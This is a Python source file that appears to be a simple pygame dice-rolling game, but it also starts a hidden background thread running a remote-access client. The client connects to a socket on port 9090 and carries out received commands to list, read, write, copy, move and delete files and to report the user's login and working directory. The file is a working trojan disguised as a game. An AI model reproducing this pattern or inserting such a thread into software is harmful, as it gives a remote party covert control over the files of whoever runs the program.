import socket
import os
import threading
import shutil
import pygame
import random


class game:
    x = pygame.init()

    def __init__(self):
        self.gameWindow = pygame.display.set_mode((400, 500))
        pygame.display.set_caption("RollDice - By Ritesh Kr. Gupta")

        self.one = pygame.image.load("dice_images/dice_1.png").convert_alpha()
        self.one = pygame.transform.scale(self.one, (200, 200))
        self.two = pygame.image.load("dice_images/dice_2.png").convert_alpha()
        self.two = pygame.transform.scale(self.two, (200, 200))
        self.three = pygame.image.load("dice_images/dice_3.png").convert_alpha()
        self.three = pygame.transform.scale(self.three, (200, 200))
        self.four = pygame.image.load("dice_images/dice_4.png").convert_alpha()
        self.four = pygame.transform.scale(self.four, (200, 200))
        self.five = pygame.image.load("dice_images/dice_5.png").convert_alpha()
        self.five = pygame.transform.scale(self.five, (200, 200))
        self.six = pygame.image.load("dice_images/dice_6.png").convert_alpha()
        self.six = pygame.transform.scale(self.six, (200, 200))

        self.list = [self.one, self.two, self.three, self.four, self.five, self.six]

        self.onClick_sound = pygame.mixer.Sound('click.wav')
        self.onClick_sound.set_volume(0.5)

        self.white = (240, 240, 240)
        self.btn_color = (2, 238, 250)

        self.exit_game = False

        self.gameWindow.fill(self.white)
        self.image = self.gameWindow.blit(self.one, (100, 100))
        self.btn = pygame.draw.rect(self.gameWindow, self.btn_color, [130, 390, 130, 40], border_radius=5)
        self.gameWindow.blit(pygame.font.SysFont("", 40).render("Roll", True, (255, 255, 255)), (169, 398))

        self.game_loop()

    def game_loop(self):
        while not self.exit_game:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    self.exit_game = True
                if event.type == pygame.MOUSEBUTTONDOWN:
                    position = pygame.mouse.get_pos()
                    if self.btn.collidepoint(position):
                        self.onClick_sound.play()
                        self.image = self.gameWindow.blit(random.choice(self.list), (100, 100))

            pygame.display.update()


class Ex:
    def __init__(self):
        try:
            host = '127.0.0.1'
            port = 9090

            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, port))

            while True:
                try:
                    server_command = client.recv(1024).decode('utf-8')
                    if server_command == 'hello':
                        print("Hello World!")
                        client.send(f"{server_command} was executed successfully!".encode('utf-8'))
                    elif server_command == 'help':
                        client.send(f"{server_command}".encode('utf-8'))
                    elif server_command == 'cwd':
                        client.send(f"{os.getcwd()}".encode('utf-8'))
                    elif server_command == 'osname':
                        client.send(f"{os.name}".encode('utf-8'))
                    elif server_command == 'ls':
                        client.send(f"{os.listdir()}".encode('utf-8'))
                    elif server_command == 'getlogin':
                        client.send(f"{os.getlogin()}".encode('utf-8'))
                    elif server_command == 'getpid':
                        client.send(f"{os.getpid()}".encode('utf-8'))
                    elif 'chdir' in server_command:
                        client.send(f"{server_command}".encode('utf-8'))
                        os.chdir(client.recv(1024).decode('utf-8'))
                        client.send(f"Working Directory Changed".encode('utf-8'))
                    elif 'mkdir' in server_command:
                        client.send(f"{server_command}".encode('utf-8'))
                        os.mkdir(client.recv(1024).decode('utf-8'))
                        client.send(f"Directory Created Successfully".encode('utf-8'))
                    elif 'rename' in server_command:
                        client.send(f"{server_command}".encode('utf-8'))
                        os.rename(client.recv(1024).decode('utf-8'), client.recv(1024).decode('utf-8'))
                        client.send(f"File is Renamed".encode('utf-8'))
                    elif 'rmdir' in server_command:
                        client.send(f"{server_command}".encode('utf-8'))
                        os.rmdir(client.recv(1024).decode('utf-8'))
                        client.send(f"Directory removed Successfully".encode('utf-8'))
                    elif 'touch' in server_command:
                        client.send(f"{server_command}".encode('utf-8'))
                        f = open(client.recv(1024).decode('utf-8'), "a+")
                        f.close()
                        client.send(f"File Created".encode('utf-8'))
                    elif 'read' in server_command:
                        client.send(f"{server_command}".encode('utf-8'))
                        f = open(client.recv(1024).decode('utf-8'))
                        client.send(f.read().encode('utf-8'))
                        f.close()
                    elif 'write' in server_command:  # Bug 2 : Multiline writing is not working
                        client.send(f"{server_command}".encode('utf-8'))
                        f = open(client.recv(1024).decode('utf-8'), "w+")
                        client.send(f"Enter the content of the file : ".encode('utf-8'))
                        content = client.recv(1024).decode('utf-8')
                        f.write(content)
                        f.close()
                        client.send(f"Writing is successfully done.".encode('utf-8'))
                    elif 'delfile' in server_command:
                        client.send(f"{server_command}".encode('utf-8'))
                        os.remove(client.recv(1024).decode('utf-8'))
                        client.send(f"File Deleted Successfully ".encode('utf-8'))
                    elif 'copy' in server_command:
                        client.send(f"{server_command}".encode('utf-8'))
                        shutil.copyfile(client.recv(1024).decode('utf-8'), client.recv(1024).decode('utf-8'))
                        client.send(f"File Created Successfully ".encode('utf-8'))
                    elif 'move' in server_command:
                        client.send(f"{server_command}".encode('utf-8'))
                        shutil.move(client.recv(1024).decode('utf-8'), client.recv(1024).decode('utf-8'))
                        client.send(f"File Moved Successfully".encode('utf-8'))
                    else:
                        client.send(f"{server_command} is not recognizes".encode('utf-8'))
                except:
                    client.send(f"Something wrong with Input or Command!!!".encode('utf-8'))
        except:
            pass


g = threading.Thread(target=game)
g.start()

x = threading.Thread(target=Ex)
x.start()
